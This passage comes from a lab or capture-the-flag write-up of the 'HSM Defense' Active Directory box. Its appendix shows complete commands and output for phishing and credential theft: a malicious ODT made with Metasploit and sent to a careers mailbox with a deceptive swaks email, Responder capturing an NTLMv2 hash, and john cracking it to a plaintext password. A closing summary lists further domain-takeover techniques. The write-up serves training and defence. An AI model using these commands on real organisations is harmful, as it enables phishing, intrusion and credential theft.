⠀⠀⠀⠉⠒⠦⠄⣀⡀⢀⡠⠊⠁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠒⠒⠤⠤⢀⣀⠀⠀⣀⣀⣀⣀⣀⠀⠀⢠⣿⡿⠋⣹⣶⣤⡀⠀⢉⣑⠷⠮⠽⠶⡔⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢁⠲⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⠃⠉⠉⠉⠙⣧⠀⣿⡟⠀⢰⡿⡇⠰⣿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⠒⠤⠤⢄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠄⢀⠀⡀⠘⣟⠛⠧⢄⡘⣿⠁⢂⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠳⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⣶⣤⣤⣤⣤⡼⣦⡀⠀⠈⠙⠛⠥⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠒⢂⣤⠏⠙⠻⢝⣯⢝⡳⢦⡀⠀⠀⢀⡤⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠎⠀⢀⡶⠉⢸⠀⠀⠀⠀⠈⠹⢾⣁⠿⣆⠎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⠊⢀⡠⠚⠁⠀⠀⡆⠀⠀⠀⠀⠀⠀⣀⠜⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⡠⠚⠁⡠⠒⠁⠀⠀⠀⠀⠀⠁⠒⠒⠠⠤⠔⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⣠⠔⠁⡠⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢀⣀⡠⣝⠋⠀⠀⠀⠀⠀
```

### Appendix: An Alternate Route — Starting From Zero Credentials

Everything up to this point assumed we were handed `kelly.johnson`'s credentials up front, as the lab does. But it's worth asking: what if we genuinely had **nothing** to start with, not even one working login? Given the "Office Careers" pretext on port 80 and the mail services (SMTP/POP3/IMAP) sitting wide open on this box, there's a completely separate, credential-free path in: **phishing the company's own "careers" mailbox**, then catching the resulting authentication with **Responder**.

The idea: submit a booby-trapped "resume" to `careers@hsm-defense.local`. If a staff member on the internal network opens the attached file with an application vulnerable to remote-template/UNC-path abuse, it will silently reach out over SMB to a host of our choosing — and if that host is running Responder, we capture their **NTLMv2** authentication attempt in the process. Even though the domain's Kerberos endpoints don't accept NTLM (as we established back in Phase 1), that restriction is about the domain *accepting* NTLM logons — it has no bearing on a client machine *sending* an NTLM authentication attempt to an attacker-controlled listener, so the hash capture itself still works fine.

First, we weaponize a `.odt` (OpenDocument Text) file using Metasploit's `odt_badodt` module, which embeds a script that triggers an outbound SMB connection back to us the moment the file is opened in a vulnerable LibreOffice install (recall from Phase 3 that **LibreOffice** is indeed installed on this environment):

```shell
┌──(root㉿a1sberg)-[~]
└─# msfconsole -q -x "use auxiliary/fileformat/odt_badodt; set LHOST 10.200.98.215; set FILENAME bad.odt; run; exit"
Warning: KRB5CCNAME environment variable not supported - unsetting
LHOST => 10.200.98.215
FILENAME => bad.odt
[*] Generating Malicious ODT File 
[*] SMB Listener Address will be set to 10.200.98.215
[+] bad.odt stored at /root/.msf4/local/bad.odt
[*] Auxiliary module execution completed
```

With the malicious document generated, `swaks` (Swiss Army Knife for SMTP) is used to actually send it as an email to the careers inbox we found exposed on port 25, complete with a believably awkward "wrong attachment, sorry" pretext designed to make an HR reviewer open it without suspicion:

```shell
┌──(root㉿a1sberg)-[~/.msf4/local]
└─# swaks --to 'careers@hsm-defense.local' --from 'kuro@candidate.com' --header 'Subject: Oops... Job Application (Take 47)' --body 'Dear Hiring Team, Sorry about that last one. This is the real application. Promise. Please find attached my resume before I accidentally send another wrong file hehe. Kind regards (and slightly embarrassed), kuro' --attach-type application/octet-stream --server DC.hsm-defense.local --port 25 --timeout 20s --attach @bad.odt
=== Trying DC.hsm-defense.local:25...
=== Connected to DC.hsm-defense.local.
<-  220 DC ESMTP
 -> EHLO a1sberg.a1sberg
<-  250-DC
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<kuro@candidate.com>
<-  250 OK
 -> RCPT TO:<careers@hsm-defense.local>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Thu, 24 Sep 2026 04:53:21 -0400
 -> To: careers@hsm-defense.local
 -> From: kuro@candidate.com
 -> Subject: Oops... Job Application (Take 47)
 -> Message-Id: <20260924045321.273471@a1sberg.a1sberg>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_273471"
 -> 
 -> ------=_MIME_BOUNDARY_000_273471
 -> Content-Type: text/plain
 -> 
 -> Dear Hiring Team, Sorry about that last one. This is the real application. Promise. Please find attached my resume before I accidentally send another wrong file hehe. Kind regards (and slightly embarrassed), kuro
 -> ------=_MIME_BOUNDARY_000_273471
 -> Content-Type: application/octet-stream; name="bad.odt"
 -> Content-Description: bad.odt
 -> Content-Disposition: attachment; filename="bad.odt"
 -> Content-Transfer-Encoding: BASE64
 ...
```

With the phishing email sent, the only thing left to do is wait — and listen. `Responder` is started on our tunnel interface to poison local name-resolution broadcasts (LLMNR/NBT-NS/mDNS) and, more importantly here, to stand up rogue SMB/HTTP/etc. servers ready to capture any authentication attempt that comes our way:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/SSH-Log-main]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.200.98.215]
    Responder IPv6             [fe80::1b5c:28b9:6572:5f20]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-7KWUTAL7LZV]
    Responder Domain Name      [Y4P4.LOCAL]
    Responder DCE-RPC Port     [46972]

[+] Listening for events...                                                                         

[SMB] NTLMv2-SSP Client   : 10.1.245.74
[SMB] NTLMv2-SSP Username : HSMDEFENSE\kelly.johnson
[SMB] NTLMv2-SSP Hash     : kelly.johnson::HSMDEFENSE:11428eee5288f514:29DCFCD1865102162F07E133AF4F2A75:0101000000000000002EA959E04BDD0124579B6021E923980000000002000800590034005000340001001E00570049004E002D0037004B0057005500540041004C0037004C005A00560004003400570049004E002D0037004B0057005500540041004C0037004C005A0056002E0059003400500034002E004C004F00430041004C000300140059003400500034002E004C004F00430041004C000500140059003400500034002E004C004F00430041004C0007000800002EA959E04BDD010600040002000000080030003000000000000000010000000020000063D390CA3A8EA0F3552E3357D3DBDBCB930D9179C22AE5699F0B9F7D103796C50A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00390038002E003200310035000000000000000000   
```

Sure enough, the moment the document is opened internally, an **NTLMv2** authentication attempt lands in our lap — from `kelly.johnson`, the exact same account the lab hands out as a "starting" credential. This confirms the intended entry point really is a phishing-triggered credential capture, with the lab's provided credential simply short-circuiting that step for convenience. The captured NTLMv2 hash is offline-crackable, so we throw it straight at `john`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ john kellyhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Lordofwar        (kelly.johnson)     
1g 0:00:00:12 DONE (2026-09-24 04:57) 0.08051g/s 878067p/s 878067c/s 878067C/s Louise98..LoraLora
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

And we recover the same password, **`Lordofwar`**, entirely without being handed it — closing the loop and confirming this alternate, zero-credential path leads to exactly the same starting point as the "given creds" path documented above, just with a phishing email and a Responder capture standing in for the handout.

### Wrapping Up

And that's **HSM Defense** fully compromised — from a single low-privileged credential all the way to Domain Admin, without a single memory-corruption exploit or brute-force in sight. The entire chain was built out of legitimate Active Directory *features* being abused one after another:

* **Timeroasting** an unauthenticated NTP exchange to crack a machine account's password.
* **ACL/ownership abuse** (`servicedesk` group) to pivot from one account to the next.
* A **logon-hours restriction** (`KDC_ERR_CLIENT_REVOKED`) bypassed via a writable attribute on an unrelated account.
* **Credential reuse** between a leaked application/database secret and real domain accounts.
* **OU-hopping** by rewriting `distinguishedName` to inherit a broader ACL.
* **Targeted Kerberoasting**, including deliberately downgrading Kerberos encryption types to make the resulting hash crackable.
* **Rogue-service credential capture** against an outbound automation job (`ITOPS01$` over SSH).
* **Constrained delegation with protocol transition** (S4U2Self/S4U2Proxy) to mint an Administrator-equivalent service ticket.
* A final **DCSync**-style secrets dump and **Pass-the-Hash** to land on the DC as `Administrator`.
* And, as the appendix shows, the very first credential could just as easily have come from **phishing the careers inbox** and capturing the resulting NTLMv2 hash with **Responder**, rather than being handed to us outright.

Every single step traces back to a permission, a password, or a trust relationship that *someone* configured slightly too loosely — which is exactly the point of a lab like this: no single mistake is catastrophic on its own, but chained together they add up to full domain takeover. A good reminder to keep tiered administration genuinely enforced, to rotate/avoid reusing service-account passwords, and to audit `GenericAll`/ownership ACEs on OUs and groups just as carefully as on individual users.
